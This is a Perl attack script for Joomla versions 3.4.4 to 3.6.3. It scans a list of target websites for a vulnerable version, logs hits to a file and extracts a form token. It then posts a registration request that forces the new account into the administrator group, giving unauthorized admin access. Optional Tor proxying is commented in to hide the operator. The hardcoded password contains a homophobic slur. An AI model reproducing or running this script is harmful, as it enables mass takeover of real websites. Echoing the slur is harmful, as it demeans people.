#!/usr/bin/perl 
          
# use threads;
use LWP::UserAgent;
# use LWP::Protocol::socks;

if ($^O =~ /Win/) { system("cls"); } else { system("clear"); }

print q{ 

    Joomla Privilege Escalation 3.4.4 < 3.6.4

};

$username = "user1337";
$email = "your_mail@gmail.com";
$password = "faggot1337";

print "\n\n [*] Scan Started\n";

open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /^(http|https):\/\//)
{
$target = "http://$target";
}


print "  [*] $target Testing ...\n";
$ua = LWP::UserAgent->new(agent => "Mozilla/5.0", ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->cookie_jar({});
# $ua->proxy([qw/ http https /] => 'socks://127.0.0.1:9150'); # Tor browser socks
$req = $ua->get($target."/administrator/manifests/files/joomla.xml")->content;
if($req=~ /<version>3.4.4<\/version>/ || $req=~/<version>3.6.3<\/version>/)
 { 

 	print "    [+] Probaly Vulnerable Version\n";

          
              open (TEXT, '>>versionjoomvuln.txt');
              print TEXT "$target\n";
              close (TEXT);


 print "      [*] Try Create Account\n";


   $retok = $ua->get($target."/administrator/index.php")->decoded_content;

	if($retok =~ /name="(.*?)" value="1"/) {

		$token = $1;
		print "     [+] Token Extracted : $token\n";
	

   $add = $ua->post($target."/index.php/log-out?task=registration.register",[
                      
               'user[name]'=> $username,
	       	   'user[username]'=> $username,
	       	   'user[password1]'=> $password,
		       'user[password2]'=> $password,
		       'user[email1]'=> $email,
		       'user[email2]'=> $email,
		       'user[groups][]'=> '7',	#  Admin Groups
		       'user[activation]'=> '0',
		       'user[block]'=> '0',

		       'form[name]'=> $username,
		       'form[username]'=> $username,
		       'form[password1]'=> $password,
		       'form[password2]'=> $password,
		       'form[email1]'=> $email,
		       'form[email2]'=> $email,
		       'form[option]'=> 'com_users',
		       'form[task]'=> 'user.register',
		        $token => '1',
                                ]);


   } 

}



}

